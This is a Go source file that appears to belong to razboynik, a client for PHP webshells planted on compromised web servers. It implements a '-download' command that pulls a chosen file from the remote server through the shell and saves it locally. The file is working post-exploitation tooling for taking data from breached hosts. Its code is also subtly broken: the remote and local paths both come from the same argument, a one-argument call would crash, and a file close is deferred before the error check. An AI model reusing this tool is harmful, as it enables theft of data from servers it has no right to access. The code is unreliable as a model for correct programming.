package phpmodule

import (
	"errors"
	"io"
	"os"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboynik/services/kernel"
)

var Downloaditem = kernel.Item{
	Name: "-download",
	Exec: func(l *kernel.Line, config *razboy.Config) kernel.Response {
		var (
			args          []string
			local, remote string
			err           error
			request       *razboy.REQUEST
		)

		args = l.GetArg()

		if len(args) < 1 {
			return kernel.Response{Err: errors.New("Please write the path of the file to download")}
		}

		request = razboy.CreateRequest(l.GetRaw(), config)
		remote = getRemote(args, config.Shellscope)
		local = getLocal(args)

		_, err = DownloadAction(remote, local, request)
		kernel.Write(l.GetStdout(), l.GetStderr(), err, "Downloaded successfully to "+local)

		return kernel.Response{Err: err, Body: true}
	},
}

func DownloadAction(remote, local string, request *razboy.REQUEST) (*razboy.RESPONSE, error) {
	var (
		out *os.File
		res *razboy.RESPONSE
		err error
	)

	request.Action = razboy.CreateDownload(remote)
	res, err = razboy.Send(request)

	if err != nil {
		return res, err
	}

	out, err = os.Create(local)

	defer out.Close()

	if err != nil {
		return nil, err
	}

	_, err = io.Copy(out, res.GetHTTP().Body)

	return res, err
}

func getRemote(arr []string, context string) string {
	var path string

	path = arr[1]

	if context != "" {
		path = context + "/" + path
	}

	return path
}

func getLocal(args []string) string {
	if len(args) > 1 {
		return args[1]
	}

	return "output.txt"
}
